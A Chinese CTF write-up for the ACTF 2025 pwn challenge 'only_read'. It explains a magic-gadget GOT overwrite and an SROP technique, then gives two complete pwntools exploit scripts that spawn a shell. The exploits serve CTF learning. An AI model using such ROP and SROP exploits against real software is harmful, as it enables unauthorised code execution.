---
title: ACTF-2025-pwn
tags:
    - XCTF
    - pwn
categories:
    - 比赛记录
cover: /img/治不开心药.png
---
# ACTF-2025-pwn

## 前言
继续备战

## only_read

题如其名，只有一个read 函数，通过magic gadgets 来打。当然也有其他解法

### ida分析
### 思路
#### magic gadgets
首先要知道经典的gadgets
```python
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14;
```
这两条gadgets，可以凑一个任意半个地址写。上面那个是程序里的，下面的是libc中的。选择这条是因为它的低三字节和read接近，只需要改两个字节，就可以把read修改为这个。（ps：4,5,6都是说第二次read时的payload）
1. 那么第一次read，就是修改rbp，然后返回read继续读。
2. 第二次read，前面0x80字节开始为后续的利用作准备。rbp设置为，这次的读入的地址，同时，这地址要下一次能修改到read@got[]
3. 第三次read，就修改掉read@got为0x110a46 这条gadget
4. read结束之后，rsp指向rbp+8，rbp是之前设计好的，也就是会回到第二次read时的前0x80字节之间。在这里调用read@plt，来执行改好的gadget。这时可以控制rbx，rbp。
5. 然后，接上0x40111c这条gadget，把read@got[]改为ogg。
6. 然后，可以接一个pop_rbp抬栈，再调用read@plt，来执行ogg。

#### SROP
如何找syscall; ret;
```shell
ROPgadget --binary libc.so.6 --opcode 0f05c3
```
这是找syscall的一个方法。当然read函数的过程中其实有syscall，我们只要把偏移改过去就行。当然要提前控制好`rax`, 那么这题就是要想办法控制`rax`为`0xf`
1. 第一次read，修改rbp，返回read继续读。
2. 第二次read，前0x80字节可以部署一些准备工作，rbp往bss的高地址写，便于控制。
3. 第三次read，要控制rbp，为read@got[]附近，下一次要修改read偏移直接到sysread。同时把SigreturnFrame，部署在这里。
4. 第四次read，把偏移改好
5. 这一次，因为没有设置好rax，所以还是read，随便输下一次就是SROP。
#### nepnep
[ACTF 2025 Writeup by Nepnep | CN-SEC 中文网](https://cn-sec.com/archives/4011487.html)
### exp
#### magic gadgets
```python
from esy import *
context.log_level="debug"
context.terminal=['tmux','splitw','-h','-l','66%']
context.arch="amd64"
io,elf=loadfile("./only_read","",0)

'''
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000058aa8 : pop rbp ; pop rbx ; ret
0x00000000000584d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14; ret;
'''
one_gadgets=[0xef52b,0xef4ce,0x583f3,0x583ec]
gdb.attach(io,"b *0x401158")
got_read = elf.got['read']
addr_reread = 0x401142
gadget=[0x40111c,0x058aa8,0x0584d5]
payload=b"a"*0x80+p64(got_read+0x100)+p64(addr_reread)
io.send(payload)

sleep(1)

rop_chain = b"1" * 8
rop_chain += flat([
    elf.plt['read'],
    0xfffdeae5, # 修改read@got 为 ogg
    got_read + 0x3d,
    0, 0, 0,
    gadget[0]
], length=0x38)
rop_chain += p64(gadget[0]+1)
rop_chain += p64(0x404190)
rop_chain += p64(elf.plt['read'])
rop_chain = rop_chain.ljust(0x80, b"\x00")
rop_chain += p64(0x403ff8 + 0x88)
rop_chain += p64(addr_reread)
io.sendline(rop_chain)

sleep(1)
io.send(b"\x46\x0a")
io.interactive()
```
#### SROP
```python
from esy import *
context.log_level="debug"
context.terminal=['tmux','splitw','-h','-l','66%']
context.arch="amd64"
io,elf=loadfile("./only_read","",0)

'''
0x0000000000098fb6: syscall; ret;
0x000000000011c3f9: 0f05c3;
'''
tar=0x404088
bss=0x404800
read=0x401142
rbp=0x40111D
got=0x404000#-->0x5f
leave=0x40115D

gdb.attach(io,"b *0x401158")
payload=b'\x00'*0x80+p64(tar+0x80-0x8)+p64(read)
io.send(payload)
pause()

payload=p64(bss+0x100-0x90)+p64(read+4)
payload=payload.ljust(0x80,b'\x00')+p64(bss-0x100)+p64(read)
io.send(payload)
pause()

s=SigreturnFrame()
bin_sh=0x404710
s.rax=0x3b
s.rdi=bin_sh
s.rdx=0
s.rsi=0
s.rip=0x401044
payload =p64(bss).ljust(0x80,b'\x00')+p64(got+0x80)+p64(read)
payload+=b"/bin/sh\x00"+b'\x00'*0x160+p64(rbp)+p64(0xf+0x80)+p64(read)+bytes(s)[8:]
io.send(payload)
pause()
io.send(b'\x5f')
pause()
io.sendline(b'a')
io.interactive()

```

